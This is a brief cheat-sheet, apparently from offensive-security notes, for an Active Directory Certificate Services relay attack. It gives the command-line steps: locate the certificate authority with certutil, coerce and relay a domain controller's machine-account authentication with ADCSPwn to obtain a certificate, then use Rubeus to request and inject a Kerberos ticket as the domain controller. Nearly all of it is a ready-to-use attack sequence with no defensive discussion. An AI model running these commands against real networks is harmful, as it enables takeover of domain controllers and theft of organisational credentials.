### Source
https://github.com/bats3c/ADCSPwn  

### Find certificate autthority
```
certutil.exe
```

### Coerce authentication from machine account and relay to certificate service, write certificate to file
```
adcspwn.exe --adcs &lt;certificateAuthority&gt; --remote &lt;domainController&gt; --output &lt;base64Certificate&gt;
```

### Request kerberos TGT
```
Rubeus.exe asktgt /outfile:&lt;file&gt; /user:&lt;domainController&gt; /ptt /certificate:&lt;base64Certificate&gt;
```


